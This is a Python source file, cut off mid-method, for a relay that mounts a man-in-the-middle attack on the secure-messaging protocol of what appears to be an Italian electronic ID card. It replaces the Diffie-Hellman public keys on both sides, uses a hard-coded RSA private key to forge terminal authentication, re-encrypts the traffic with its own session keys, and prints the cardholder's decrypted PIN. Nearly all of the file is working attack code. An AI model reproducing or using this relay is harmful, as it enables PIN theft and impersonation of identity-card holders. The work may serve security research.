from enum import Enum
import random
import hashlib
from Crypto.Cipher import DES3, DES

def ISOPadLen(Len):
	if Len & 0x7 == 0:
		return Len+8
	else:
		return Len - (Len & 0x7) + 0x08
    
def ISOPad(data:list):
    size = ISOPadLen(len(data))
    resp = [0 for _ in range(size)]
    resp[:len(data)] = data.copy()
    resp[len(data)] = 0x80

    return resp

def RemoveISOPad(paddedData:list):
    for i in range(len(paddedData) - 1, -1, -1):
        if paddedData[i] != 0:
            if paddedData[i] != 0x80:
                raise Exception("Padding error")
            else:
                return i
    
    raise Exception("Padding error")

def ASN1TLength(tag:int):
    tLen = 0
    while tag != 0:
        tLen += 1
        tag >>= 8
    
    return tLen

def ASN1LLength(len:int):
    if len < 0x80:
        return 1
    else:
        if len<=0xff:
            return 2
        elif len<=0xffff:
            return 3
        elif len<=0xffffff:
            return 4
        elif len<=0xffffffff:
            return 5
    
    raise Exception("Not a valid ASN1 lenth")

def putASN1Tag(tag:int, data:list):
    tPos = 0
    while tag != 0:
        b = tag >> 24
        if b != 0:
            data[tPos] = b
            tPos += 1
        tag <<= 8 
        tag &= 0xffffffff

def putASN1Length(len:int, data:list, start:int):
    if len < 0x80:
        data[start+0] = len
    else:
        if len <= 0xff:
            data[start+0] = 0x81
            data[start+1] = len
        elif len <= 0xffff:
            data[start+0] = 0x82
            data[start+1] = len >> 8
            data[start+2] = len & 0xff
        elif len <= 0xffffff:
            data[start+0] = 0x83
            data[start+1] = len >> 16
            data[start+2] = (len >> 8) & 0xff
            data[start+3] = len & 0xff
        elif len <= 0xffffffff: 
            data[start+0] = 0x84
            data[start+1] = len >> 24
            data[start+2] = (len >> 16) & 0xff
            data[start+3] = (len >> 8) & 0xff
            data[start+4] = len & 0xff

def setASN1Tag(data:list, tag:int, content:list):
    tl = ASN1TLength(tag)
    ll = ASN1LLength(len(content))
    data += [0 for _ in range(tl+ll+len(content))]
    putASN1Tag(tag, data)
    putASN1Length(len(content), data, tl)
    data[tl+ll:] = content.copy()

    return data

def ASN1Tag(tag:int, content:list):
    tl = ASN1TLength(tag)
    ll = ASN1LLength(len(content))
    result = [0 for _ in range(tl+ll+len(content))]
    putASN1Tag(tag, result)
    putASN1Length(len(content), result, tl)
    result[tl+ll:] = content.copy()
    
    return result

class CDES3:
    def __init__(self, key:list, iv:list):
        self.keySize = len(key)
        self.keyVal = bytes(key)
        self.iv = bytes(iv)
        self.cipher = DES3.new(self.keyVal,DES3.MODE_CBC, iv=self.iv)

            
    def encrypt(self, data:list):
        resp = list(self.cipher.encrypt(bytes(data)))

        return resp
    
    def decrypt(self, data:list):
        resp = list(self.cipher.decrypt(bytes(data)))
        
        return resp

class CMAC:
    def __init__(self, key:list, iv:list):
        self.iv = bytes(iv)
        self.keySize = len(key)
        match self.keySize:
            case 16:
                self.keyVal1 = bytes(key[:8])
                self.keyVal2 = bytes(key[8:])
                self.keyVal3 = self.keyVal1
            case 24:
                self.keyVal1 = bytes(key[:8])
                self.keyVal2 = bytes(key[8:16])
                self.keyVal3 = bytes(key[16:])
            case _:
                raise Exception("Key size must be 16 or 24 bytes long")
        
        self.cipherDES = DES.new(self.keyVal1, DES.MODE_CBC, iv=self.iv)
        self.cipherDES3 = DES3.new(self.keyVal1+self.keyVal2, DES3.MODE_CBC, iv=self.iv)
    
    def mac(self, data:list):
        if len(data) > 8:
            tmp_iv = self.cipherDES.encrypt(bytes(data[:-8]))[-8:]
            self.cipherDES3 = DES3.new(self.keyVal1+self.keyVal2, DES3.MODE_CBC, iv=tmp_iv)
        
        resp = list(self.cipherDES3.encrypt(bytes(data[-8:])))
        self.cipherDES3 = DES3.new(self.keyVal1+self.keyVal2, DES3.MODE_CBC, iv=self.iv)
        
        return resp

        
class Stage(Enum):
    START = 1
    INIT_DH_PARAM = 2
    READ_DAPP_PUBKEY = 3
    DH_KEY_EXCHANGE = 4
    DAPP = 5
    VERIFYPIN = 6
    READSERIALECIE = 7
    READCERTCIE = 8
    END = 9

DEFMODULE = [ 0xba, 0x28, 0x37, 0xab, 0x4c, 0x6b, 0xb8, 0x27, 0x57, 0x7b, 0xff, 0x4e, 0xb7, 0xb1, 0xe4, 0x9c, 0xdd, 0xe0, 0xf1, 0x66, 0x14, 0xd1, 0xef, 0x24, 0xc1, 0xb7, 0x5c, 0xf7, 0x0f, 0xb1, 0x2c, 0xd1, 0x8f, 0x4d, 0x14, 0xe2, 0x81, 0x4b, 0xa4, 0x87, 0x7e, 0xa8, 0x00, 0xe1, 0x75, 0x90, 0x60, 0x76, 0xb5, 0x62, 0xba, 0x53, 0x59, 0x73, 0xc5, 0xd8, 0xb3, 0x78, 0x05, 0x1d, 0x8a, 0xfc, 0x74, 0x07, 0xa1, 0xd9, 0x19, 0x52, 0x9e, 0x03, 0xc1, 0x06, 0xcd, 0xa1, 0x8d, 0x69, 0x9a, 0xfb, 0x0d, 0x8a, 0xb4, 0xfd, 0xdd, 0x9d, 0xc7, 0x19, 0x15, 0x9a, 0x50, 0xde, 0x94, 0x68, 0xf0, 0x2a, 0xb1, 0x03, 0xe2, 0x82, 0xa5, 0x0e, 0x71, 0x6e, 0xc2, 0x3c, 0xda, 0x5b, 0xfc, 0x4a, 0x23, 0x2b, 0x09, 0xa4, 0xb2, 0xc7, 0x07, 0x45, 0x93, 0x95, 0x49, 0x09, 0x9b, 0x44, 0x83, 0xcb, 0xae, 0x62, 0xd0, 0x09, 0x96, 0x74, 0xdb, 0xf6, 0xf3, 0x9b, 0x72, 0x23, 0xa9, 0x9d, 0x88, 0xe3, 0x3f, 0x1a, 0x0c, 0xde, 0xde, 0xeb, 0xbd, 0xc3, 0x55, 0x17, 0xab, 0xe9, 0x88, 0x0a, 0xab, 0x24, 0x0e, 0x1e, 0xa1, 0x66, 0x28, 0x3a, 0x27, 0x4a, 0x9a, 0xd9, 0x3b, 0x4b, 0x1d, 0x19, 0xf3, 0x67, 0x9f, 0x3e, 0x8b, 0x5f, 0xf6, 0xa1, 0xe0, 0xed, 0x73, 0x6e, 0x84, 0xd5, 0xab, 0xe0, 0x3c, 0x59, 0xe7, 0x34, 0x6b, 0x42, 0x18, 0x75, 0x5d, 0x75, 0x36, 0x6c, 0xbf, 0x41, 0x36, 0xf0, 0xa2, 0x6c, 0x3d, 0xc7, 0x0a, 0x69, 0xab, 0xaa, 0xf6, 0x6e, 0x13, 0xa1, 0xb2, 0xfa, 0xad, 0x05, 0x2c, 0xa6, 0xec, 0x9c, 0x51, 0xe2, 0xae, 0xd1, 0x4d, 0x16, 0xe0, 0x90, 0x25, 0x4d, 0xc3, 0xf6, 0x4e, 0xa2, 0xbd, 0x8a, 0x83, 0x6b, 0xba, 0x99, 0xde, 0xfa, 0xcb, 0xa3, 0xa6, 0x13, 0xae, 0xed, 0xd9, 0x3a, 0x96, 0x15, 0x27, 0x3d ]
DEFPRIVEXP = [ 0x47, 0x16, 0xc2, 0xa3, 0x8c, 0xcc, 0x7a, 0x07, 0xb4, 0x15, 0xeb, 0x1a, 0x61, 0x75, 0xf2, 0xaa, 0xa0, 0xe4, 0x9c, 0xea, 0xf1, 0xba, 0x75, 0xcb, 0xa0, 0x9a, 0x68, 0x4b, 0x04, 0xd8, 0x11, 0x18, 0x79, 0xd3, 0xe2, 0xcc, 0xd8, 0xb9, 0x4d, 0x3c, 0x5c, 0xf6, 0xc5, 0x57, 0x53, 0xf0, 0xed, 0x95, 0x87, 0x91, 0x0b, 0x3c, 0x77, 0x25, 0x8a, 0x01, 0x46, 0x0f, 0xe8, 0x4c, 0x2e, 0xde, 0x57, 0x64, 0xee, 0xbe, 0x9c, 0x37, 0xfb, 0x95, 0xcd, 0x69, 0xce, 0xaf, 0x09, 0xf4, 0xb1, 0x35, 0x7c, 0x27, 0x63, 0x14, 0xab, 0x43, 0xec, 0x5b, 0x3c, 0xef, 0xb0, 0x40, 0x3f, 0x86, 0x8f, 0x68, 0x8e, 0x2e, 0xc0, 0x9a, 0x49, 0x73, 0xe9, 0x87, 0x75, 0x6f, 0x8d, 0xa7, 0xa1, 0x01, 0xa2, 0xca, 0x75, 0xa5, 0x4a, 0x8c, 0x4c, 0xcf, 0x9a, 0x1b, 0x61, 0x47, 0xe4, 0xde, 0x56, 0x42, 0x3a, 0xf7, 0x0b, 0x20, 0x67, 0x17, 0x9c, 0x5e, 0xeb, 0x64, 0x68, 0x67, 0x86, 0x34, 0x78, 0xd7, 0x52, 0xc7, 0xf4, 0x12, 0xdb, 0x27, 0x75, 0x41, 0x57, 0x5a, 0xa0, 0x61, 0x9d, 0x30, 0xbc, 0xcc, 0x8d, 0x87, 0xe6, 0x17, 0x0b, 0x33, 0x43, 0x9a, 0x2c, 0x93, 0xf2, 0xd9, 0x7e, 0x18, 0xc0, 0xa8, 0x23, 0x43, 0xa6, 0x01, 0x2a, 0x5b, 0xb1, 0x82, 0x28, 0x08, 0xf0, 0x1b, 0x5c, 0xfd, 0x85, 0x67, 0x3a, 0xc0, 0x96, 0x4c, 0x5f, 0x3c, 0xfd, 0x2d, 0xaf, 0x81, 0x42, 0x35, 0x97, 0x64, 0xa9, 0xad, 0xb9, 0xe3, 0xf7, 0x6d, 0xb6, 0x13, 0x46, 0x1c, 0x1b, 0xc9, 0x13, 0xdc, 0x9a, 0xc0, 0xab, 0x50, 0xd3, 0x65, 0xf7, 0x7c, 0xb9, 0x31, 0x94, 0xc9, 0x8a, 0xa9, 0x66, 0xd8, 0x9c, 0xdd, 0x55, 0x51, 0x25, 0xa5, 0xe5, 0x9e, 0xcf, 0x4f, 0xa3, 0xf0, 0xc3, 0xfd, 0x61, 0x0c, 0xd3, 0xd0, 0x56, 0x43, 0x93, 0x38, 0xfd, 0x81 ]
DEFPUBEXP = [ 0x00, 0x01, 0x00, 0x01 ]


APDU_GETDHDUOPDATA_G = [ 0x00, 0xcb, 0x3f, 0xff, 0x0c, 0x4D, 0x0A, 0x70, 0x08, 0xBF, 0xA1, 0x01, 0x04, 0xA3, 0x02, 0x97, 0x00 ]
APDU_GETDHDUOPDATA_GETDATA = [ 0x00, 0xc0, 0x00, 0x00, 0x12 ]
APDU_GETDHDUOPDATA_P = [  0x00, 0xcb, 0x3f, 0xff, 0x0c, 0x4D, 0x0A, 0x70, 0x08, 0xBF, 0xA1, 0x01, 0x04, 0xA3, 0x02, 0x98, 0x00 ]
APDU_GETDHDUOPDATA_Q = [  0x00, 0xcb, 0x3f, 0xff, 0x0c, 0x4D, 0x0A, 0x70, 0x08, 0xBF, 0xA1, 0x01, 0x04, 0xA3, 0x02, 0x99, 0x00 ]

#READ_DAPP_PUBKEY
READ_READDAPPPUBKEY = [0x00, 0xa4, 0x02, 0x04, 0x02, 0x10, 0x04]
ADPU_PUBKEY1 = [0x00, 0xb0, 0x00, 0x00, 0x80]
ADPU_PUBKEY2 = [0x00, 0xb0, 0x00, 0x80, 0x80]
ADPU_PUBKEY3 = [0x00, 0xb0, 0x01, 0x00, 0x80]

#DH_KEY_EXCHANGE
MSE_SET1 = [ 0x10, 0x22, 0x41, 0xa6 ]
MSE_SET2 = [ 0x00, 0x22, 0x41, 0xa6 ]
APDU_GET_DATA_DATA1 = [ 0x00, 0xcb, 0x3f, 0xff, 0x06, 0x4d, 0x04, 0xa6, 0x02, 0x91, 0x00 ]
APDU_GET_DATA_DATA2 = [ 0x00, 0xc0, 0x00, 0x00, 0x08 ]
DIFFENC = [ 0x00, 0x00, 0x00, 0x01 ]
DIFFMAC = [ 0x00, 0x00, 0x00, 0x02 ]

#DAPP
SELECTKEY = [ 0x0c, 0x22, 0x81, 0xb6 ]
VERIFYCERT1 = [ 0x1c, 0x2A, 0x00, 0xAE ]
VERIFYCERT2 = [ 0x0c, 0x2A, 0x00, 0xAE ]
SETCHR = [ 0x0c, 0x22, 0x81, 0xA4 ]
GETCHALLENGE = [ 0x0c, 0x84, 0x00, 0x00 ]
EXTAUTH1 = [ 0x1c, 0x82, 0x00, 0x00 ]
EXTAUTH2 = [ 0x0c, 0x82, 0x00, 0x00 ]
INTAUTH = [ 0x0c, 0x22, 0x41, 0xa4 ]
GIVERANDOM = [ 0x0c, 0x88, 0x00, 0x00 ]

SNIFD = [ 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01 ]
SN_ICC = [ 0x00, 0x68, 0x37, 0x56, 0x18, 0x03, 0x30, 0x1f ]

#READSERIALECIE && READCERTCIE
SELECTFILE = [ 0x0c, 0xa4, 0x02, 0x04 ]
ReadFile = [ 0x0c, 0xb0, 0x00, 0x00 ]

class RelayMiddleman(object):
    #INIT_DH_PARAM
    dh_g = 0
    dh_gBytes = []
    dh_p = 0
    dh_pBytes = []
    #ByteDynArray dh_q;
    dh_qBytes = []

    #DH_KEY_EXCHANGE
    dh_pubKey_mitm = 0
    dh_pubKey_mitmBytes = []
    dh_prKey_mitm = 0
    dh_prKey_mitmBytes = []
    #BYTE *dh_pubKey_mitmBytes;
    dh_IFDpubKeyBytes = []
    dh_IFDpubKey = 0
    dh_ICCpubKeyBytes = []
    dh_ICCpubKey = 0
    #sessENC_IFD, sessMAC_IFD, sessSSC_IFD
    #sessENC_ICC, sessMAC_ICC, sessSSC_ICC

    #READSERIALECIE && READCERTCIE
    cnt = 0

    def __init__(self):
        self.stage = Stage.START

        self.curr_apduSize = 0
        self.curr_apdu = bytes()

        self.cnt = 0

    @staticmethod
    def increment(seq:list):
        for i in range(len(seq) - 1, -1, -1):
            if seq[i] < 255:
                seq[i] += 1
                for j in range(i+1, len(seq)):
                    seq[j] = 0
                return
        
    def craft_respSM(self, keyEnc:list, keySig:list, resp:list, seq:list):
        RelayMiddleman.increment(self.sessSSC_ICC)
        RelayMiddleman.increment(self.sessSSC_IFD)
        calcMac = []
        swBa = []
        tagMacBa = []
        iv = [0 for _ in range(8)]

        encDes = CDES3(keyEnc, iv)
        sigMac = CMAC(keySig, iv)

        calcMac = seq.copy()
        calcMac += resp[0:resp[0+1] + 2]

        sw = [ 0x90, 0x00 ]
        tagMac = [ 0x8e, 0x08 ]

        tmp = resp[0:resp[0+1] + 2]
        smMac = sigMac.mac(ISOPad(calcMac))

        return tmp+tagMac+smMac+sw

    def SM(self, keyEnc:list, keySig:list, apdu:list, seq:list):
        RelayMiddleman.increment(self.sessSSC_ICC)
        RelayMiddleman.increment(self.sessSSC_IFD)

        smHead = apdu[:4]
        smHead[0] |= 0x0C

        calcMac = seq.copy()
        calcMac += smHead
        calcMac = ISOPad(calcMac)

        iv = [0 for _ in range(8)]

        encDes = CDES3(keyEnc, iv)
        sigMac = CMAC(keySig, iv)

        Val01 = [1]
        datafield = []
        doob = []
        if apdu[4] != 0 and len(apdu) > 5:
            enc = encDes.encrypt(ISOPad(apdu[5:apdu[4]+5]))
            if (apdu[1] & 1) == 0:
                Val01 += enc
                setASN1Tag(doob,0x87, Val01)
            else:
                setASN1Tag(doob, 0x85, enc)

            calcMac += doob
            datafield += doob

        if apdu[4] == 0 and len(apdu) > 7:
            enc = encDes.encrypt(ISOPad(apdu[7: ((apdu[5] << 8)| apdu[6])+7]))
            if apdu[1] & 1 == 0:
                Val01 += enc
                setASN1Tag(doob, 0x87, Val01)
            else:
                setASN1Tag(doob, 0x85, enc)

            calcMac += doob
            datafield += doob

        if len(apdu) == 5 or len(apdu) == (apdu[4] + 6):
            le = [apdu[len(apdu) - 1]]
            setASN1Tag(doob, 0x97, le)
            calcMac += doob
            datafield += doob

        macBa = sigMac.mac(ISOPad(calcMac))

        tagMacBa = ASN1Tag(0x8e, macBa)
        datafield += tagMacBa


        elabResp =  []
        if len(datafield)<0x100:
            elabResp = smHead + [len(datafield)] + datafield + [0x00]
        else:
            lenBA = [len(datafield)]
            lenBA.reverse()
            lenBa = lenBA[-3:]

            elabResp = smHead + lenBa + datafield + [0x00] + [0x00]

        return elabResp


    def handleInPDU(self, inPDU: bytes):
        """
        This method is called on each PDU that is fed into the realy (vdpu -> vicc).
        It may be overwritten to modify the packages send from the terminal to the 
        real smart card.
        """
        self.prev_apduSize = self.curr_apduSize
        self.prev_apdu = self.curr_apdu
        self.curr_apdu = inPDU
        self.curr_apduSize = len(self.curr_apdu)

        match self.stage:
            case Stage.START:
                #self.curr_apdu is a list of int
                if self.curr_apdu == APDU_GETDHDUOPDATA_G:
                    self.stage = Stage.INIT_DH_PARAM
            case Stage.DH_KEY_EXCHANGE:
                self.dh_key_exchange_in()
            case Stage.DAPP:
                self.dapp_in()
            case Stage.VERIFYPIN:
                self.verifypin_in()
            case Stage.READSERIALECIE:
                self.readserialecie_in()
            case Stage.READCERTCIE:
                self.readcertcie_in()
            
        return self.curr_apdu

    def handleOutPDU(self, outPDU: bytes):
        """
        This method is called on each PDU that is produced by the relay (vicc -> vdpu).
        It may be overwritten to modify the packages send from the real smart card to the
        terminal.
        """
        self.resp = outPDU
        self.respSize = len(outPDU)

        match self.stage:
            case Stage.INIT_DH_PARAM:
                self.init_dh_param_out()
            case Stage.READ_DAPP_PUBKEY:
                self.read_dapp_pubkey_out()
            case Stage.DH_KEY_EXCHANGE:
                self.dh_key_exchange_out()
            case Stage.DAPP:
                self.dapp_out()
            case Stage.VERIFYPIN:
                self.verifypin_out()
            case Stage.READSERIALECIE:
                self.readserialecie_out()
            case Stage.READCERTCIE:
                self.readcertcie_out()

        return self.resp  
    



    def dh_key_exchange_in(self):
        if self.curr_apdu[0:4] == MSE_SET1:
            self.dh_prKey_mitmBytes = [random.randint(0,255) for i in range(len(self.dh_qBytes))]
            while self.dh_qBytes[0] < self.dh_prKey_mitmBytes[0]:
                self.dh_prKey_mitmBytes = [random.randint(0,255) for i in range(len(self.dh_qBytes))]

            self.dh_prKey_mitmBytes[-1] |= 1

            self.dh_g = int.from_bytes(bytes(self.dh_gBytes), 'big')
            self.dh_p = int.from_bytes(bytes(self.dh_pBytes), 'big')
            self.dh_prKey_mitm = int.from_bytes(bytes(self.dh_prKey_mitmBytes), 'big')

            self.dh_pubKey_mitm = pow(self.dh_g, self.dh_prKey_mitm, self.dh_p)
            self.dh_pubKey_mitmBytes = list(int.to_bytes(self.dh_pubKey_mitm, 256, 'big'))

            #TODO check array offsets
            self.dh_IFDpubKeyBytes[:self.curr_apduSize-15] = self.curr_apdu[15:]
            self.curr_apdu[15:] = self.dh_pubKey_mitmBytes[:self.curr_apduSize-15]

        if self.curr_apdu[0:4] == MSE_SET2:
            #TODO check array offsets
            self.dh_IFDpubKeyBytes[245:] = self.curr_apdu[5:16]
            self.curr_apdu[5:] = self.dh_pubKey_mitmBytes[245:256]
            


    def dapp_in(self):
        if self.curr_apdu[:4] == SELECTKEY:
            iv = [0 for _ in range(8)]
            
            encDes = CDES3(self.sessENC_IFD, iv)
            supp = self.curr_apdu[8:16]
            data = encDes.decrypt(supp)
            data = data[:RemoveISOPad(data)]

            le = [0]
            head = [0x00, 0x22, 0x81, 0xb6]
            smApdu = head + [len(data)] + data + le
            smApdu = self.SM(self.sessENC_ICC, self.sessMAC_ICC, smApdu, self.sessSSC_ICC)

            self.curr_apdu = smApdu.copy()
        elif self.curr_apdu[:4] == VERIFYCERT1:
            iv = [0 for _ in range(8)]
            encDes = CDES3(self.sessENC_IFD, iv)
            supp = self.curr_apdu[9:9+232]
            data = encDes.decrypt(supp)
            data = data[:RemoveISOPad(data)]

            emptyBa = []
            le = [0]
            head = [0x10, 0x2A, 0x00, 0xAE]
            smApdu = head + [len(data)] + data + emptyBa
            smApdu = self.SM(self.sessENC_ICC, self.sessMAC_ICC, smApdu, self.sessSSC_ICC)

            self.curr_apdu = smApdu.copy()
        elif self.curr_apdu[:4] == VERIFYCERT2:
            iv = [0 for _ in range(8)]
            encDes = CDES3(self.sessENC_IFD, iv)
            supp = self.curr_apdu[9:9+128]
            data = encDes.decrypt(supp)
            data = data[:RemoveISOPad(data)]

            emptyBa = []
            le = [0]
            head = [0x00, 0x2A, 0x00, 0xAE]
            smApdu = head + [len(data)] + data + emptyBa
            smApdu = self.SM(self.sessENC_ICC, self.sessMAC_ICC, smApdu, self.sessSSC_ICC)

            self.curr_apdu = smApdu.copy()
        elif self.curr_apdu[:4] == SETCHR:
            iv = [0 for _ in range(8)]
            encDes = CDES3(self.sessENC_IFD, iv)
            supp = self.curr_apdu[8:8+16]
            data = encDes.decrypt(supp)
            data = data[:RemoveISOPad(data)]

            emptyBa = []
            le = [0]
            head = [0x00, 0x22, 0x81, 0xA4]
            smApdu = head + [len(data)] + data + emptyBa
            smApdu = self.SM(self.sessENC_ICC, self.sessMAC_ICC, smApdu, self.sessSSC_ICC)

            self.curr_apdu = smApdu.copy()
        elif self.curr_apdu[:4] == GETCHALLENGE:
            chLen = [8]
            head = [0x00, 0x84, 0x00, 0x00]

            data = []
            smApdu = head + [len(data)] + data + chLen
            smApdu = self.SM(self.sessENC_ICC, self.sessMAC_ICC, smApdu, self.sessSSC_ICC)

            self.curr_apdu = smApdu.copy()
        elif self.curr_apdu[:4] == EXTAUTH1:
            # crafting ext auth message
            padSize = 222
            PRND = [random.randint(0,255) for i in range(padSize)]
            toHash = PRND + self.dh_pubKey_mitmBytes + SNIFD + self.challenge + self.dh_ICCpubKeyBytes + self.dh_gBytes + self.dh_pBytes + self.dh_qBytes 
            toHash = list(hashlib.sha256(bytes(toHash)).digest())
            toSignBytes = [0x6a] + PRND + toHash + [0xbc]

            module = int.from_bytes(DEFMODULE, 'big')
            privexp = int.from_bytes(DEFPRIVEXP, 'big')
            toSign = int.from_bytes(toSignBytes, 'big')
            signResp = list(int.to_bytes(pow(toSign, privexp, module), 256, 'big'))
        
            self.chResponse = SNIFD + signResp

            # crafting SM apdu
            data = self.chResponse[:231]
            emptyBa = []
            le = [0]
            head = [0x10, 0x82, 0x00, 0x00]
            smApdu = head + [len(data)] + data + emptyBa
            smApdu = self.SM(self.sessENC_ICC, self.sessMAC_ICC, smApdu, self.sessSSC_ICC)

            self.curr_apdu = smApdu.copy()
        elif self.curr_apdu[:4] == EXTAUTH2:
            data = self.chResponse[231:231+33]
            emptyBa = []
            le = [0]
            head = [0x00, 0x82, 0x00, 0x00]
            smApdu = head + [len(data)] + data + emptyBa
            smApdu = self.SM(self.sessENC_ICC, self.sessMAC_ICC, smApdu, self.sessSSC_ICC)

            self.curr_apdu = smApdu.copy()
        elif self.curr_apdu[:4] == INTAUTH:
            iv = [0 for _ in range(8)]
            encDes = CDES3(self.sessENC_IFD, iv)
            supp = self.curr_apdu[8:8+8]
            data = encDes.decrypt(supp)
            data = data[:RemoveISOPad(data)]

            emptyBa = []
            le = [0]
            head = [0x00, 0x22, 0x41, 0xa4]
            smApdu = head + [len(data)] + data + emptyBa
            smApdu = self.SM(self.sessENC_ICC, self.sessMAC_ICC, smApdu, self.sessSSC_ICC)

            self.curr_apdu = smApdu.copy()
        elif self.curr_apdu[:4] == GIVERANDOM:
            iv = [0 for _ in range(8)]
            encDes = CDES3(self.sessENC_IFD, iv)
            supp = self.curr_apdu[8:8+16]
            data = encDes.decrypt(supp)
            self.rndIFD = data[:RemoveISOPad(data)]

            emptyBa = []
            le = [0]
            head = [0x00, 0x88, 0x00, 0x00]
            smApdu = head + [len(self.rndIFD)] + self.rndIFD + emptyBa
            smApdu = self.SM(self.sessENC_ICC, self.sessMAC_ICC, smApdu, self.sessSSC_ICC)

            self.curr_apdu = smApdu.copy()

    def verifypin_in(self):
        iv = [0 for _ in range(8)]
        encDes = CDES3(self.sessENC_IFD, iv)
        supp = self.curr_apdu[8:8+16]
        data = encDes.decrypt(supp)
        decPin = data[:RemoveISOPad(data)]

        print("\nPIN:", str([i-48 for i in decPin]))

        emptyBa = []
        le = [0]
        head = [0x00, 0x20, 0x00, 0x81]
        smApdu = head + [len(decPin)] + decPin + emptyBa
        smApdu = self.SM(self.sessENC_ICC, self.sessMAC_ICC, smApdu, self.sessSSC_ICC)

        self.curr_apdu = smApdu.copy()

    def readserialecie_in(self):
        if self.curr_apdu[:4] == SELECTFILE:
            emptyBa = []
            le = [0]
            head = [0x00, 0xa4, 0x02, 0x04]
            data = [0x10, 0x02]
            smApdu = head + [len(data)] + data + emptyBa
            smApdu = self.SM(self.sessENC_ICC, self.sessMAC_ICC, smApdu, self.sessSSC_ICC)

            self.curr_apdu = smApdu.copy()

        if self.curr_apdu[:4] == ReadFile:
            chunk = [128]
            emptyBa = []
            le = [0]
            head = [0x00, 0xb0, (self.cnt >> 8) & 0xff , (self.cnt & 0xff)]
            data = []
            smApdu = head + [len(data)] + data + chunk
            smApdu = self.SM(self.sessENC_ICC, self.sessMAC_ICC, smApdu, self.sessSSC_ICC)

            self.curr_apdu = smApdu.copy()

    def readcertcie_in(self):
        if self.curr_apdu[:4] == SELECTFILE:
            emptyBa = []
            le = [0]
            head = [0x00, 0xa4, 0x02, 0x04]
            data = [0x10, 0x03]
            smApdu = head + [len(data)] + data + emptyBa
            smApdu = self.SM(self.sessENC_ICC, self.sessMAC_ICC, smApdu, self.sessSSC_ICC)

            self.curr_apdu = smApdu.copy()

        if self.curr_apdu[:4] == ReadFile:
            chunk = [128]
            emptyBa = []
            le = [0]
            head = [0x00, 0xb0, (self.cnt >> 8) & 0xff , (self.cnt & 0xff)]
            data = []
            smApdu = head + [len(data)] + data + chunk
            smApdu = self.SM(self.sessENC_ICC, self.sessMAC_ICC, smApdu, self.sessSSC_ICC)

            self.curr_apdu = smApdu.copy()

    def init_dh_param_out(self):
        if self.curr_apdu[:17] == APDU_GETDHDUOPDATA_G:
            self.dh_gBytes = self.resp[18:self.respSize-20+18]

        if self.curr_apdu[:17] == APDU_GETDHDUOPDATA_P:
            self.dh_pBytes = self.resp[18:self.respSize-20+18]

        if self.curr_apdu[:17] == APDU_GETDHDUOPDATA_Q:
            #TODO implement a proper CASN parser (ANS1)
            tmp = []
            tmp = self.resp[:42]
            self.dh_qBytes = tmp[-32:]
            self.stage = Stage.READ_DAPP_PUBKEY

        if self.curr_apdu[:5] == APDU_GETDHDUOPDATA_GETDATA:
            if self.prev_apdu[:17] == APDU_GETDHDUOPDATA_G:
                self.dh_gBytes += self.resp[:18]
            if self.prev_apdu[:17] == APDU_GETDHDUOPDATA_P:
                self.dh_pBytes += self.resp[:18]


    def read_dapp_pubkey_out(self):
        #TODO chek if array offsets are correct
        if self.curr_apdu[:5] == ADPU_PUBKEY1:
            self.resp[9:self.respSize-11+9] = DEFMODULE[:self.respSize-11]

        if self.curr_apdu[:5] == ADPU_PUBKEY2:
            self.resp[:self.respSize-2] = DEFMODULE[119:self.respSize-2+119]

        if self.curr_apdu[:5] == ADPU_PUBKEY3:
            self.resp[:9] = DEFMODULE[247:256]
            self.stage = Stage.DH_KEY_EXCHANGE

    def dh_key_exchange_out(self):
        if self.curr_apdu[:11] == APDU_GET_DATA_DATA1:
            self.dh_ICCpubKeyBytes[:248] = self.resp[8:248+8]
            self.resp[8:248+8] = self.dh_pubKey_mitmBytes[:248]

        if self.curr_apdu[:11] == APDU_GET_DATA_DATA2:
            self.dh_ICCpubKeyBytes[248:256] = self.resp[:8]
            self.resp[:8] = self.dh_pubKey_mitmBytes[248:256]


            self.dh_IFDpubKey = int.from_bytes(bytes(self.dh_IFDpubKeyBytes), 'big')
            self.dh_ICCpubKey = int.from_bytes(bytes(self.dh_ICCpubKeyBytes), 'big')

        
            secretIFD = pow(self.dh_IFDpubKey, self.dh_prKey_mitm, self.dh_p)
            secretIFDBytes = list(int.to_bytes(secretIFD, 256, 'big'))
            self.sessENC_IFD = list(hashlib.sha256(bytes(secretIFDBytes + DIFFENC)).digest()[:16])
            self.sessMAC_IFD = list(hashlib.sha256(bytes(secretIFDBytes + DIFFMAC)).digest()[:16])


            secretICC = pow(self.dh_ICCpubKey, self.dh_prKey_mitm, self.dh_p)
            secretICCBytes = list(int.to_bytes(secretICC, 256, 'big'))
            self.sessENC_ICC = list(hashlib.sha256(bytes(secretICCBytes + DIFFENC)).digest()[:16])
            self.sessMAC_ICC = list(hashlib.sha256(bytes(secretICCBytes + DIFFMAC)).digest()[:16])


            self.sessSSC_IFD = [0 for _ in range(8)]
            self.sessSSC_IFD[7] = 1

            self.sessSSC_ICC = [0 for _ in range(8)]
            self.sessSSC_ICC[7] = 1



            self.stage = Stage.DAPP

    
    def dapp_out(self):
        if self.curr_apdu[:4] == GETCHALLENGE:
            # dec decipher using session key of the mitm with the ICC
            iv = [0 for _ in range(8)]
            encDes_ICC = CDES3(self.sessENC_ICC, iv)
            
            # saving the encrypted challenge
            tmp = self.resp[3:3+16]
            data = encDes_ICC.decrypt(tmp)
            self.challenge = data[:RemoveISOPad(data)]

            # crafting the response
            RelayMiddleman.increment(self.sessSSC_ICC)
            RelayMiddleman.increment(self.sessSSC_IFD)
            encDes_IFD = CDES3(self.sessENC_IFD, iv)
            sigMac_IFD = CMAC(self.sessMAC_IFD, iv)

            encChallenge = encDes_IFD.encrypt(ISOPad(self.challenge))

            Val01 = [1]
            datafield = []
            Val01 += encChallenge
            setASN1Tag(datafield, 0x87, Val01)
            calcMac = self.sessSSC_IFD.copy()
            macTail= [ 0x99, 0x02, 0x90, 0x00 ]

            calcMac += datafield
            calcMac += macTail
            smMac = sigMac_IFD.mac(ISOPad(calcMac))
            sw = [ 0x90, 0x00 ]

            data = datafield + macTail
            ccfb = []
            setASN1Tag(ccfb, 0x8e, smMac)
            respBa = data + ccfb + sw

            self.resp = respBa.copy()
        elif self.curr_apdu[:4] == GIVERANDOM:
            # crafting the int auth payload
            padSize = 222
            PRND2 = [random.randint(0,255) for i in range(padSize)]
            toHashIFD = PRND2 + self.dh_pubKey_mitmBytes + SN_ICC + self.rndIFD + self.dh_IFDpubKeyBytes + self.dh_gBytes + self.dh_pBytes + self.dh_qBytes 
            calcHashIFD = list(hashlib.sha256(bytes(toHashIFD)).digest())

